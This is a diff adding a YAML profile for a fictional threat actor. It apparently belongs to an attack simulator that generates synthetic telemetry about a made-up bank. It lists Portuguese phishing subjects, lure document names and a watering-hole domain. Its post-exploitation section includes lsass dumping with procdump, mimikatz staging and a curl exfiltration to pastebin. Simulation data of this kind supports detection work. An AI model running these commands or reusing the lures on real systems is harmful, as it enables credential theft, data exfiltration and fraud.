@@ -1,0 +1,84 @@
+name : Saqueadores
+effectiveness: 80
+count_init_passive_dns: 10
+max_wave_size: 3
+attacks:
+  - recon:browsing
+  - delivery:supply_chain
+  - email:malware_delivery
+  - watering_hole:malware_delivery
+watering_hole_domains:
+  - boletobancariofacil.com.br
+watering_hole_target_roles:
+  - Financeiro
+  - Presidente
+  - Gerente
+  - Caixa
+domain_themes:
+  - software
+  - atualizacao
+  - mobile
+  - verificacao
+  - seguranca
+  - instalacão
+  - aviso
+  - scan
+  - alerta
+sender_themes: 
+  - atendimento ao cliente
+  - suporte
+  - admin
+  - ti
+  - notificacoes
+  - sem resposta
+  - informacao
+subjects:
+  - "IMPORTANTE: SUA SENHA ESTÁ EXPIRANDO"
+  - "RE: Transação número 12393" 
+  - "IMPORTANTE: ATUALIZAÇÃO DE VPN - INSTALE AGORA!!!"
+  - Uma tentativa de login suspeita foi observada em sua conta
+  - Cartão de crédito sem anuidade para sempre
+  - Novo guia para extrato online - LEIA AGORA
+recon_search_terms:
+  - nova modalidade emprestimo bancario
+  - como chamar suporte ti
+  - macros estao ativados
+  - processo suporte ti
+  - cartao de credito gratis
+  - politica expiracao senha
+  - senha padrao Banco Mares
+file_names:
+  - Software_Update.docx
+  - FERRAMENTA_RESET_SENHA.docx
+  - Patch_Seguranca_Critico.docx
+  - Patch_instructions.docx
+  - EnvolveLabs_Research_Tool.docx
+  - IMPORTANTE_INSTRUCOES.docx
+tlds:
+  - com
+  - io
+  - info
+spoofs_email: False
+malware:
+  - chupacabra
+post_exploit_commands:
+  - name: cmd.exe
+    process: ipconfig
+  - name: cmd.exe
+    process: "C:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp"
+  - name: cmd.exe
+    process: "C:\\Windows\\system32\\cmd.exe /C getsystem"
+  - name: procdump64.exe
+    process: "C:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp"
+  - name: ipconfig.exe
+    process: "ipconfig /all"
+  - name: echo.exe
+    process: echo GET mimikatz.exe >> ftp.txt
+  - name: echo.exe
+    process: "copy C:\\Users\\Public\\Documents\\*  F:\\exfil\\Users\\"
+  - name: echo.exe
+    process: "copy C:\\Users\\Public\\Downloads\\*  F:\\exfil\\Users\\"
+  - name: echo.exe
+    process: "copy C:\\Users\\Public\\Research\\*  F:\\exfil\\Users\\"
+  - name: echo.exe
+    process: "curl F:\\exfil\\full.gz https://pastebin.com/mZ38bYLt:/NotCompanySecrets.gz"
